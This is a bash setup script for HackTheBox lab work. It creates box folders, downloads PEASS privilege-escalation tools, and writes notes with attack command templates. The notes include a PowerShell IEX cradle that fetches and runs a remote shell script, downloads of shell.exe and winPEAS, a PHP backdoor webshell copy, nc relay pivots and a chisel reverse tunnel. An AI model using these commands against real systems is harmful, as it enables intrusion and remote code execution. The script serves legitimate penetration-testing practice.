#!/bin/bash
# to run type '. /directory/setup'
# set box name, IP and ostype
#for folder in $(ls /opt/); do cd /opt/$folder/; sudo git pull; done

BOXNAME=update_script
LAST=143
OS=linux

export IP=10.10.11.$LAST                           #enter box IP
export SELF=`hostname -I | awk '{print $2}'`
export HOME=/home/kali/hackthebox/$BOXNAME          #enter box Name
export SELF=$(hostname -I | awk '{print$2}')

read -p "Press [Enter] key if this is first run"
read -p "Are you sure this is the first run?"
## Bash add pause prompt for 5 seconds ##
read -t 5 -p "I am going to wait for 5 seconds only ..."
#only run if first time or will lose all work
mkdir $HOME
mkdir $HOME/nmap
mkdir $HOME/buster
mkdir $HOME/www
mkdir $HOME/$BOXNAME
touch $HOME/notes
touch $HOME/.hushlogin


# copy windows specif scripts to windows box or linux specific to linux box
cp /opt/Scripts/auto_stabilize_shell.sh /$HOME/
cp /home/kali/.bashrc /$HOME/
if [[ "$OS" == "win" ]]; then
    curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -o /$HOME/www/winPEASany.exe
    curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat -o /$HOME/www/winPEAS.bat
    chmod +x /$HOME/www/*
    cp /usr/share/windows-resources/binaries/netcat32/netcat-1.11/nc64.exe /$HOME/www
else
    curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o $HOME/www/linpeas.sh
    curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64 -o /$HOME/www/linpeas_linux_amd64
    cp /opt/pspy64s /$HOME/www/
    chmod +x /$HOME/www/*
fi

echo '#export IP='$IP > $HOME/notes
echo '#masscan -p1-65535,U:1-65535 $IP --rate=1000 -e tun0' >> $HOME/notes
echo '#nmap -sC -sV -p- -vvv -oN $HOME/nmap/Initial $IP' >> $HOME/notes
echo '#gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt -s 200 -x php,html,txt,xml,sh,py -o buster/80dir.log' >> $HOME/notes
echo '#gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o buster/root.log' >> $HOME/notes
echo '#gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -o buster/root_files.log' >> $HOME/notes
echo '#gobuster vhosts -u http://$BOXNAME.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o buster/vhosts.log' >> $HOME/notes
echo '#gobuster dns domain.com -o buster/dom.log' >> $HOME/notes
echo '#echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:8080/shell.ps1')" | iconv --to-code UTF16LE | base64 -w0' >> $HOME/notes
echo '#powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.155/winPEAS.bat', 'C:\temp\winPEAS.bat')"' >> $HOME/notes
echo '#IWR http://10.10.10.10/shell.exe -OutFile shell.exe' >> $HOME/notes
echo '#cp /usr/share/webshells/php/simple-backdoor.php .' >> $HOME/notes
echo "#nikto -h $IP"
echo "add machine name domain.htb to /etc/hosts (search to ensure named correct)"
echo "#nikto -h domain.htb"
echo "any problems kill VBoxClient clipboard etc."
# cool way to pivot/scan 
echo "really cool way to pivot/scan with nc" >> $HOME/notes
echo "mkfifo reply" >> $HOME/notes
echo "nc -klvnp 65535 < reply | nc 127.0.0.1 6739 > reply" >> $HOME/notes
echo "(nc -klvnp <port to use> < reply | nc 127.0.0.1 <port interested in scanning etc> > reply)" >> $HOME/notes
echo "(dont forget to rm reply)" >> $HOME/notes
echo "Then can just scan port 6379 through 65535 etc." >> $HOME/notes
# more ways to pivot
echo "# 9510 and other ports through chisel" >> $HOME/notes
echo "# On Kali" >> $HOME/notes
echo "kali@kali:~$ ./chisel server -p 9002 --reverse  " >> $HOME/notes
echo "# On Windows" >> $HOME/notes
echo "./chisel client 10.10.14.128:9002 R:8080:localhost:8080 R:9510:localhost:9510 R:9512:localhost:9512" >> $HOME/notes
echo "# if using metasploit" >> $HOME/notes
echo "portfwd add -l 9510 -p 9510 -r 10.10.11.115" >> $HOME/notes
echo "check this out - git clone https://github.com/Flangvik/SharpCollection.git for windows sharp binaries" >> $HOME/notes
# Build obsidian files for not keeping
# Cover page
echo '<p align="center">' >> $HOME/$BOXNAME/000\ -\ Cover.md
echo '  <img  width=1024 src="" />' >> $HOME/$BOXNAME/000\ -\ Cover.md
echo '</p>' >> $HOME/$BOXNAME/000\ -\ Cover.md
# loot page
echo '# Creds' >> $HOME/$BOXNAME/00\ -\ Loot.md
echo '| Username | Password | Description |' >> $HOME/$BOXNAME/00\ -\ Loot.md
echo '| --- | --- | -- |' >> $HOME/$BOXNAME/00\ -\ Loot.md
echo '| | | |' >> $HOME/$BOXNAME/00\ -\ Loot.md
# Nmap page
echo '# Nmap' >> $HOME/$BOXNAME/05\ -\ Nmap.md
echo '| Port | Service | Description |' >> $HOME/$BOXNAME/05\ -\ Nmap.md
echo '| --- | --- | --- |' >> $HOME/$BOXNAME/05\ -\ Nmap.md
echo '| 22 | ssh | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |' >> $HOME/$BOXNAME/05\ -\ Nmap.md
echo '| 80 | http | |' >> $HOME/$BOXNAME/05\ -\ Nmap.md
echo ' '
echo 'Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel' >> $HOME/$BOXNAME/05\ -\ Nmap.md
# Web enumeration page
echo '# Web Enumeration' >> $HOME/$BOXNAME/10\ -\ Web\ Enumeration.md
